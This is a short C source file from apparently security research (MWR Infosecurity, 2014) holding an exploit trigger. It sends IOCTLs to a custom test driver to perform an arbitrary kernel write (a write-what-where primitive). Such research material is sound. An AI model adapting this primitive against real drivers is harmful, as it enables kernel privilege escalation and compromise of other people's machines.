#include "stdafx.h"

/*
MWR Infosecurity
Jeremy Fetiveau
August 2014
*/

/*
Here is the code triggering a write-what-where vulnerability. 
The current code exploits a custom driver. 
This function can be replaced by anything triggering 
a write-what-where in the kernel. 
*/

void write_what_where(UINT64 what, UINT64 where)
{
	HANDLE hDevice = NULL;
	ULONG nb = 0, inputLen = 0;
	PUINT64 input = NULL;
	BOOL ret;

	input = (PUINT64)malloc(8);
	inputLen = 8;

	hDevice = CreateFile(
		L"\\\\.\\KindDosDevice",
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device %x\n", GetLastError());
		return;
	}

	*input = where;

	ret = DeviceIoControl(
		hDevice,
		IOCTL_PWN2_WHERE,
		input,
		8,
		NULL,
		0,
		&nb,
		NULL);

	if (!ret)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}

	*input = what;

	ret = DeviceIoControl(
		hDevice,
		IOCTL_PWN_WHAT,
		input,
		8,
		NULL,
		0,
		&nb,
		NULL);

	if (!ret)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}

	ret = DeviceIoControl(
		hDevice,
		IOCTL_PWN3_TRIGGER,
		NULL,
		0,
		NULL,
		0,
		&nb,
		NULL
		);

	if (!ret)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}
}